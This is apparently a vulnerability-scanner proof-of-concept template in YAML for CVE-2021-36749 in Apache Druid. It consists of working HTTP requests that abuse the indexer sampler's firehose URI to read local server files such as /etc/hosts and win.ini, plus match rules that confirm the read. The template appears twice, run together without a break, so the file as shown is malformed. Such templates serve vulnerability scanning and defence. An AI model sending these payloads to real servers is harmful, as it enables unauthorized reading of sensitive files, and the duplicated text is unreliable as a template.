name: poc-yaml-apache-druid-cve-2021-36749
manual: true
transport: http
rules: 
  druid1:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/hosts"]}}},"samplerConfig":{"numRows":500}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"127.0.0.1") && response.body.bcontains(b"localhost")
  druid2:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///c://windows/win.ini"]}}},"samplerConfig":{"numRows":500}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"for 16-bit app support") && response.body.bcontains(b"fonts")
expression: druid1() || druid2()
detail:
    author: iak3ec(https://github.com/nu0l)
    links:
      - https://mp.weixin.qq.com/s/ZwhBEz2ek26Zf3F-csoRgQname: poc-yaml-apache-druid-cve-2021-36749
manual: true
transport: http
rules: 
  druid1:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/hosts"]}}},"samplerConfig":{"numRows":500}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"127.0.0.1") && response.body.bcontains(b"localhost")
  druid2:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      body: |
        {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///c://windows/win.ini"]}}},"samplerConfig":{"numRows":500}}
    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"for 16-bit app support") && response.body.bcontains(b"fonts")
expression: druid1() || druid2()
detail:
    author: iak3ec(https://github.com/nu0l)
    links:
      - https://mp.weixin.qq.com/s/ZwhBEz2ek26Zf3F-csoRgQ